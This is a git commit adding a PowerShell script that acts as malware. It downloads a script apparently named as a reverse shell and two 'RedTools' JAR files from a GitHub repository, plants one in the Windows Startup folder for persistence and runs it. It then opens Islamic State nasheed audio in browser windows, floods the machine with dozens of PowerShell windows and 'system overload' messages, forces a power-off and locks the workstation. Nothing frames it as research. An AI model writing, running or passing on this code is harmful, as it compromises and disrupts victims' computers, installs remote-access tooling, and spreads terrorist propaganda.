7f5e3d14542ea38faf8a1d14c187516a8769f785
ErrorLoadingUsername-404 <101419715+ErrorLoadingUsername-404@users.noreply.github.com>
2022-07-08 10:06:32 -0700

    Add files via upload

---
+++ overloadpart2.ps1
@@ -0,0 +1,35 @@
+mkdir C:\ProgramData\zDATAxD
+cd C:\ProgramData\zDATAxD
+$source = "https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/rev%232.ps1"
+$destination = "C:\ProgramData\zDATAxD\rev%232.ps1"
+Invoke-WebRequest -Uri $source -OutFile $destination
+$source = "https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/RedTools.jar"
+$destination = "C:\ProgramData\zDATAxD\RedTools.jar"
+Invoke-WebRequest -Uri $source -OutFile $destination
+$source = "https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/RedTools8085.jar"
+$destination = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RedTools8085.jar"
+Invoke-WebRequest -Uri $source -OutFile $destination
+cd "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+Start RedTools8085.jar
+Start-Process -FilePath msedge -ArgumentList '--new-window https://ia600503.us.archive.org/20/items/IslamicStateNasheedMediaArchive/005-.mp3';
+Start-Process -FilePath msedge -ArgumentList '--new-window https://ia802502.us.archive.org/11/items/i-sacrifice-for-the-caliphate/Abu%20Yassir%20-%20Ummati%20Qad%20laha%20fajrun.mp3';
+Start-Process -FilePath msedge -ArgumentList '--new-window https://www.youtube.com/watch?v=8ybW48rKBME';
+start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";
+start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";
+start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";
+start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";
+start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";
+start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";
+start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";
+start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";
+start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";
+start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";
+start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";start powershell -ArgumentList "netstat -a -o -n";
+msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";
+msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";
+msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";
+msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";
+msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";
+msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";msg /server:127.0.0.1 * /time:30 "system overload";
+shutdown /p;
+rundll32.exe user32.dll,LockWorkStation
